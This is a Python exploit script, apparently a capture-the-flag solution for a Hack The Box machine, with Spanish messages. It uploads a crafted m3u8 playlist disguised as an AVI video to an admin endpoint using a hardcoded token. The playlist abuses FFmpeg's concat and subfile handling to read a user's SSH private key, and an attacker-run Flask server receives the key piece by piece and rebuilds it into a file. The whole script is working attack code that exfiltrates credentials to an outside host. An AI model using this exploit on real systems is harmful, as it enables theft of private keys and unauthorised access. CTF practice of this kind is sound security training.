#!/usr/bin/python3
import requests
from argparse import ArgumentParser
from flask import Flask, request

app = Flask(__name__)
file_id_rsa = ['-----BEGIN OPENSSH PRIVATE KEY-----']
flag = 0
localhost = "127.0.0.1"
adminToken = "c0b9db4c8e4bbb24d59a3aaffa8c8b83"

@app.route('/', methods=['GET'])
def index():
    data = request.args.get('d')

    if not data:
        return ''

    data = data.replace(' ', '+')
    file_id_rsa.append(data)
    save_file()
    return ""

def save_file():
    try:
        with open("id_rsa", "w") as f:
            f.write('\n'.join(file_id_rsa) + '\n-----END OPENSSH PRIVATE KEY-----\n')
    except PermissionError:
        print("[ERROR] No tienes permisos para escribir el archivo 'id_rsa'.")
    except OSError as e:
        print(f"[ERROR] Error del sistema al escribir el archivo: {e}")

@app.route('/header.m3u8', methods=['GET'])
def header():
    global flag
    global localhost

    if flag < 2:
        flag += 1
        return (
            "#EXTM3U\n"
            "#EXT-X-MEDIA-SEQUENCE:0\n"
            "#EXTINF:1,\n"
            f"http://{localhost}/?d="
        )

    offset = len("\n".join(file_id_rsa)) + 1
    upload_video(offset)
    flag = 0
    return ""

def upload_video(offset):
    # Validación básica
    if not isinstance(offset, int) or offset < 0:
        raise ValueError(f"Offset inválido: {offset}")

    payload = (
        "#EXTM3U\n"
        "#EXT-X-MEDIA-SEQUENCE:0\n"
        "#EXTINF:10.0,\n"
        f"concat:http://{localhost}/header.m3u8|"
        f"subfile,,start,{offset},end,10000,,:/home/user/.ssh/id_rsa\n"
        "#EXT-X-ENDLIST\n"
    )

    try:
        response = requests.post(
            "http://10.129.114.222/admin/video/upload",
            headers={
                "Host": "internal-api.graph.htb",
                "admintoken": adminToken
            },
            files={
                "file": ("video.avi", payload.encode(), "video/x-msvideo")
            },
            timeout=5
        )
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Fallo al enviar el payload: {e}")

def main(ip):
    global localhost
    localhost = ip

    offset = len(file_id_rsa[0]) + 1
    upload_video(offset)
    app.run(host='0.0.0.0', port=80, debug=True)


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-l", "--localhost", help="ip de atacante", required=True)

    args = parser.parse_args()
    main(args.localhost)


